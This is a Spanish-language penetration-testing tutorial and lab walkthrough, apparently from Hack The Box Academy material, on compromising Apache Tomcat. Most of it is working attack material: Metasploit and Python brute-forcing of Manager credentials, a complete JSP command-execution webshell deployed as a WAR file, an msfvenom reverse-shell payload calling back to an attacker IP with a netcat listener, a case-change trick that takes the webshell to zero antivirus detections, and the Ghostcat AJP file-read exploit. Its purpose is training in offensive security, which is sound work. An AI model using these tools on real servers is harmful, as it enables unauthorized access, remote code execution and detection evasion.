
# Tomcat - Ataques

Hemos identificado que efectivamente hay un host Tomcat expuesto externamente por nuestro cliente. Como el alcance de la evaluación es relativamente pequeño y todos los demás objetivos no son particularmente interesantes, centremos toda nuestra atención en intentar obtener acceso interno a través de Tomcat.

Como se explicó en la sección anterior, si podemos acceder a los endpoints `/manager` o `/host-manager`, es probable que podamos lograr la ejecución remota de código en el servidor Tomcat. Comencemos por forzar la página del administrador de Tomcat en la instancia de Tomcat en `http://web01.inlanefreight.local:8180`. Podemos usar el módulo de Metasploit [auxiliar/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) para estos fines, Burp Suite Intruder o cualquier cantidad de scripts para lograr esto. Usaremos Metasploit para nuestros fines.

***

## <mark style="color:purple;">Tomcat Manager - Login Bruteforce</mark>

Primero tenemos que configurar algunas opciones. Nuevamente, debemos especificar el vhost y la dirección IP del objetivo para interactuar con el objetivo correctamente. También debemos configurarlo `STOP_ON_SUCCESS` en `true` para que el escáner se detenga cuando logremos iniciar sesión correctamente, ya que no tiene sentido generar muchas solicitudes adicionales después de un inicio de sesión exitoso.

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

Como siempre, verificamos que todo esté configurado correctamente `show options`.

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8180                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host
```

Ejecutamos `run` y obtenemos un `login successfull` para el par de credenciales `tomcat:admin`.

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Es importante tener en cuenta que hay muchas herramientas disponibles para nosotros como pentesters. Muchas existen para hacer nuestro trabajo más eficiente, especialmente porque la mayoría de las pruebas de penetración están "limitadas en el tiempo" o sujetas a estrictas restricciones de tiempo. Ninguna herramienta es mejor que otra, y no nos convierte en "malos" pentesters si usamos ciertas herramientas como Metasploit a nuestro favor.&#x20;

Siempre que entendamos cada escáner y script de explotación que ejecutamos y los riesgos, entonces utilizar este escáner correctamente no es diferente de usar Burp Intruder o escribir un script Python personalizado. Algunos dicen, "trabaje de manera más inteligente, no más duro". ¿Por qué nos haríamos un trabajo extra durante una evaluación de 40 horas con 1500 hosts dentro del alcance cuando podemos usar una herramienta en particular para ayudarnos?&#x20;

Es vital para nosotros entender cómo funcionan nuestras herramientas y cómo hacer muchas cosas manualmente. Podríamos probar manualmente cada par de credenciales en el navegador o escribir un script `cURL` con Python si lo elegimos. Como mínimo, si decidimos utilizar una determinada herramienta, deberíamos poder explicar su uso y su impacto potencial a nuestros clientes si nos preguntan durante o después de la evaluación.

Digamos que un módulo de Metasploit en particular (u otra herramienta) falla o no se comporta como creemos que debería. Siempre podemos usar Burp Suite o ZAP para hacer de proxy del tráfico y solucionar problemas. Para ello, primero, inicie Burp Suite y luego configure la `PROXIES`opción de la siguiente manera:

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080


msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
```

Podemos ver en Burp exactamente cómo funciona el escáner, teniendo en cuenta cada par de credenciales y la codificación base64 para la autenticación básica que utiliza Tomcat.

![imagen](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)

Una comprobación rápida del valor en el encabezado `Authorization` de una solicitud muestra que el escáner se está ejecutando correctamente, codificando las credenciales en base64 `admin:vagrant` de la misma manera que lo haría la aplicación Tomcat cuando un usuario intenta iniciar sesión directamente desde la aplicación web. Pruebe esto con algunos ejemplos a lo largo de este módulo para comenzar a familiarizarse con la depuración a través de un proxy.

```shell-session
afsh4ck@kali$ echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant
```

También podemos usar [este](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) script de Python para lograr el mismo resultado.

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

Este es un script muy sencillo que acepta algunos argumentos. Podemos ejecutar la flag `-h` para ver qué necesita para ejecutarse.

```shell-session
afsh4ck@kali$ python3 mgr_brute.py  -h

usage: mgr_brute.py [-h] -U URL -P PATH -u USERNAMES -p PASSWORDS

Tomcat manager or host-manager credential bruteforcing

optional arguments:
  -h, --help            show this help message and exit
  -U URL, --url URL     URL to tomcat page
  -P PATH, --path PATH  manager or host-manager URI
  -u USERNAMES, --usernames USERNAMES
                        Users File
  -p PASSWORDS, --passwords PASSWORDS
                        Passwords Files
```

Podemos probar el script con el archivo de usuarios y contraseñas de Tomcat predeterminado que utiliza el módulo Metasploit mencionado anteriormente. ¡Lo ejecutamos y obtenemos un resultado!

```shell-session
afsh4ck@kali$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

Un buen ejercicio sería crear nuestros propios scripts de inicio de sesión por fuerza bruta en Tomcat Manager usando Python y Bash, pero dejo ese ejercicio en tus manos.

***

## <mark style="color:purple;">Tomcat Manager: Carga de archivos WAR</mark>

Muchas instalaciones de Tomcat proporcionan una interfaz gráfica de usuario para administrar la aplicación. Esta interfaz está disponible de forma predeterminada en `/manager/html` y solo los usuarios a los que se les ha asignado el rol `manager-gui` pueden acceder a ella. Se pueden utilizar credenciales de administrador válidas para cargar una aplicación Tomcat empaquetada (archivo .WAR) y comprometer la aplicación. Un WAR, o archivo de aplicación web, se utiliza para implementar rápidamente aplicaciones web y almacenamiento de respaldo.

Después de realizar un ataque de fuerza bruta y responder las preguntas del caso práctico, busca`http://web01.inlanefreight.local:8180/manager/html`e ingresa las credenciales.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png" alt=""><figcaption></figcaption></figure>

La aplicación web del administrador nos permite implementar instantáneamente nuevas aplicaciones cargando archivos WAR. Se puede crear un archivo WAR utilizando la utilidad zip. Se puede descargar un webshell JSP como [este y colocarlo dentro del archivo.](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

También conviene echarle un vistazo al apartado Webshells, donde vemos otras posibles Webshells que podemos utilizar, como Laudanum:

{% content-ref url="/pages/SUVO9CR1l5QsNClxfsaU" %}
[Webshells](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/webshells.md)
{% endcontent-ref %}

```shell-session
afsh4ck@kali$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
afsh4ck@kali$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Haga clic en `Browse` para seleccionar el archivo .war y luego haga clic en `Deploy`.

![imagen](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

Este archivo se carga en la GUI del administrador, después de lo cual la aplicación `/backup` se agregará a la tabla.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/war_deployed.png" alt=""><figcaption></figcaption></figure>

Si hacemos clic en `backup`, seremos redirigidos a `http://web01.inlanefreight.local:8180/backup/` y obtendremos un error `404 Not Found`. También debemos especificar el archivo en la URL. Navegar a `http://web01.inlanefreight.local:8180/backup/cmd.jsp` nos presentará un webshell que podemos usar para ejecutar comandos en el servidor Tomcat. Desde aquí, podemos actualizar nuestro webshell a un reverse shell interactivo y continuar. Al igual que los ejemplos anteriores, podemos interactuar con este shell web a través del navegador o usando la línea de comandos. ¡Prueba ambos!

```shell-session
afsh4ck@kali$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```

Para limpiar después de nosotros mismos, podemos volver a la página principal de Tomcat Manager y hacer clic en el botón `Undeploy` junto a la aplicación `backups` después de, por supuesto, anotar el archivo y la ubicación de carga de nuestro informe, que en nuestro ejemplo es `/opt/tomcat/apache-tomcat-10.0.10/webapps`.&#x20;

Si hacemos un `ls` en ese directorio desde nuestro webshell, veremos el archivo `backup.war` cargado y el directorio `backup` que contiene el script `cmd.jsp` y se creó `META-INF` después de que se implementa la aplicación. Al hacer clic en , `Undeploy` generalmente se eliminará el archivo WAR cargado y el directorio asociado con la aplicación.

También podríamos utilizar `msfvenom` para generar un archivo WAR malicioso. El payload [java/jsp\_shell\_reverse\_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) ejecutará un reverse shell a través de un archivo JSP. Vaya a la consola de Tomcat e implemente este archivo. Tomcat extrae automáticamente el contenido del archivo WAR y lo implementa.

```shell-session
afsh4ck@kali$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

Inicie un listener Netcat y haga clic en el archivo en `/backup` para ejecutar el shell.

```shell-session
afsh4ck@kali$ nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224


id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

El módulo [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) de Metasploit se puede utilizar para automatizar el proceso que se muestra arriba, pero lo dejaremos como un ejercicio para el lector.

[Este](https://github.com/SecurityRiskAdvisors/cmd.jsp) shell web JSP es muy liviano (menos de 1 kb) y utiliza un [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) o marcador del navegador para ejecutar el código JavaScript necesario para la funcionalidad del shell web y la interfaz de usuario. Sin él, al navegar hasta un archivo cargado `cmd.jsp`no se mostraría nada. Esta es una excelente opción para minimizar nuestra huella y posiblemente evadir las detecciones de los webshells  JSP estándar (aunque es posible que sea necesario modificar un poco el código JSP).

El webshell tal como está sólo es detectado por 2/58 proveedores de antivirus.

![imagen](https://academy.hackthebox.com/storage/modules/113/vt2.png)

Un cambio simple como cambiar:

```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```

a:

```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

El resultado es que 0/58 proveedores de seguridad marcan el archivo `cmd.jsp` como malicioso al momento de escribir este artículo.

***

### Una nota rápida sobre los shells web

Cuando subimos webshells (especialmente en servidores externos), queremos evitar el acceso no autorizado. Deberíamos tomar ciertas medidas, como un nombre de archivo aleatorio (es decir, un hash MD5), limitar el acceso a nuestra dirección IP de origen e incluso protegerla con contraseña. No queremos que un atacante encuentre nuestro webshell y lo aproveche para obtener su propio punto de apoyo en un sistema.

***

## <mark style="color:purple;">CVE-2020-1938: Ghostcat</mark>

Se descubrió que Tomcat era vulnerable a un LFI no autenticada en un descubrimiento reciente llamado [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938) . Se descubrió que todas las versiones de Tomcat anteriores a 9.0.31, 8.5.51 y 7.0.100 eran vulnerables. Esta vulnerabilidad fue causada por una configuración incorrecta en el protocolo AJP utilizado por Tomcat. AJP significa Apache Jserv Protocol, que es un protocolo binario utilizado para enviar solicitudes mediante proxy. Esto se usa generalmente para enviar solicitudes mediante proxy a servidores de aplicaciones detrás de los servidores web front-end.

El servicio AJP normalmente se ejecuta en el puerto 8009 de un servidor Tomcat. Esto se puede comprobar con un análisis específico de Nmap.

```shell-session
afsh4ck@kali$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

El análisis anterior confirma que los puertos 8080 y 8009 están abiertos. El código PoC de la vulnerabilidad se puede encontrar [aquí](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) . Descargue el script y guárdelo localmente. El exploit solo puede leer archivos y carpetas dentro de la carpeta de aplicaciones web, lo que significa que no se puede acceder a archivos como `/etc/passwd`. Intentemos acceder al archivo web.xml.

```shell-session
afsh4ck@kali$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

En algunas instalaciones de Tomcat, es posible que podamos acceder a datos confidenciales dentro del archivo WEB-INF.

***

## <mark style="color:purple;">Hacia delante</mark>

Tomcat siempre es un gran hallazgo en pruebas de penetración internas y externas. Siempre que lo encontremos, deberíamos probar el área de Tomcat Manager en busca de credenciales débiles o predeterminadas. Si podemos iniciar sesión, podemos convertir rápidamente este acceso en una ejecución de código remoto. Es común encontrar Tomcat ejecutándose como usuarios con privilegios elevados, como SYSTEM o root, por lo que siempre vale la pena investigar, ya que podría proporcionarnos un punto de apoyo privilegiado en un servidor Linux o un servidor Windows unido a un dominio en un entorno de Active Directory.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo(s): 10.129.201.58 (ACADEMY-ATCKAPPS-APP02) 

vHosts necesarios para estas preguntas:

web01.inlanefreight.local
```

> Realiza un ataque de fuerza bruta contra el administrador de Tomcat en <http://web01.inlanefreight.local:8180>. ¿Cuál es el nombre de usuario válido? ¿Cual es la contraseña?

Vamos a usar el módulo `tomcat_mgr_login` de Metasploit:

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit
```

```
[-] 10.129.201.58:8180 - LOGIN FAILED: root:r00t (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:toor (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:j2deployer (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:kdsxc (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:owaspba (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:ADMIN (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:xampp (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:root
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Conseguimos un login válido: `tomcat:root`

> Obtén ejecución remota de código en la instancia de Tomcat <http://web01.inlanefreight.local:8180>. Busca y envia el contenido de tomcat\_flag.txt

Nos vamos a loguear con las credenciales que encontramos. Para ello vamos a la siguiente url:

```
http://10.129.201.58:8180/manager/html
```

Introducimos la scredenciales y accedemos sin problema:

<figure><img src="/files/0X8YD9EqnZzvdGEfLTpp" alt=""><figcaption></figcaption></figure>

Vamos a subir una webshell! Lo primero nos descargamos una webshell y lo comprimimos en un archivo war, que es el tipo de archivos que nos pemite subir Tomcat:

```shell-session
afsh4ck@kali$ wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jspjsp
afsh4ck@kali$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Ahora solo tenemos que seleccionar el archivo war y pulsar en Deploy:

<figure><img src="/files/7LAbX2h1cXe9EsMn8P2G" alt=""><figcaption></figcaption></figure>

Al pulsar en /backup nos da un 404, porque debemos especificar el nombre del archivo. Recordar que Tomcat descomprime automáticamente el archivo war, por lo que debemos especificar el nombre del archivo dentro del war:

```
http://web01.inlanefreight.local:8180/backup/cmd.jsp
```

<figure><img src="/files/OaexXyrqLF5VunRFBIE7" alt=""><figcaption></figcaption></figure>

Tenemos una webshell! Pero tenemos conectividad limitada y solo tenemos permisos de lectura, y tampoco funciona bien los comandos para buscar la flag, por lo que vamos a enviar una reverse shell para tener un mejor control.

Para ello vamos a crear un payload .war con msfvenom:

```shell-session
afsh4ck@kali$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.59 LPORT=4444 -f war > backup.war

Payload size: 1104 bytes
Final size of war file: 1104 bytes
```

Mismo proceso. Subimos el archivo .war, le damos a deploy y abrimos un listener con Netcat por el puerto 4444. Al hacer click en /backup nos devuelve una revser shell correctamente. Ya estamos dentro y tenemos mejor control:

```shell-session
afsh4ck@kali$ nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.15.59] from (UNKNOWN) [10.129.201.58] 57226
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Para buscar la ubicación de la flag podemos usar el siguiente comando:

```shell-session
omcat@app02:/$ find / -name "tomcat_flag.txt"   
find / -name "tomcat_flag.txt"
find: ‘/var/lib/snapd/cookie’: Permission denied
find: ‘/var/lib/snapd/void’: Permission denied
find: ‘/var/lib/snapd/cache’: Permission denied
find: ‘/var/lib/AccountsService/users’: Permission denied
find: ‘/var/lib/mysql-keyring’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/lib/udisks2’: Permission denied
find: ‘/var/lib/mysql-files’: Permission denied
find: ‘/var/tmp/systemd-private-b5ec36c288484aa4b7d3e8fe108d4162-systemd-timesyncd.service-SRKoZf’: Permission denied
find: ‘/var/tmp/systemd-private-b5ec36c288484aa4b7d3e8fe108d4162-apache2.service-nq50Ng’: Permission denied
find: ‘/var/tmp/systemd-private-b5ec36c288484aa4b7d3e8fe108d4162-systemd-resolved.service-ZNQWPh’: Permission denied
find: ‘/var/tmp/systemd-private-b5ec36c288484aa4b7d3e8fe108d4162-systemd-logind.service-ujfKfg’: Permission denied
<----SNIP---->
/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
```

Y leemos la flag correctamente:

```
tomcat@app02:/$ cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

t0mcat_************
```
